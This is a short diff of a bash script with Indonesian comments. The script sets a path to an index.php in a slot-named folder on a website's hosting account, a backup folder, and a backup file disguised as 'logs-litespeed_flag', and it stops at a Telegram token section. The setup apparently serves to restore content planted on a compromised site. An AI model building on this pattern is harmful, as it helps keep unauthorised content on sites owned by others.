@@ -1,12 +1,12 @@
 #!/bin/bash
 
-# Definisikan lokasi file index.php
+# Definisikan lokasi file index.php Permissions 755
 INDEX_FILE="/home/u0256282/public_html/kopkarlia.com/iboslot"
-# Definisikan lokasi folder backup
+# Definisikan lokasi folder backup Permissions 755
 BACKUP_FOLDER="/home/u0256282/public_html/file/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
-# Tentukan nama file backup
+# Tentukan nama file backup Permissions 755
 BACKUP_FILE="$BACKUP_FOLDER/logs-litespeed_flag"
 
 # Token dan ID chat Telegram
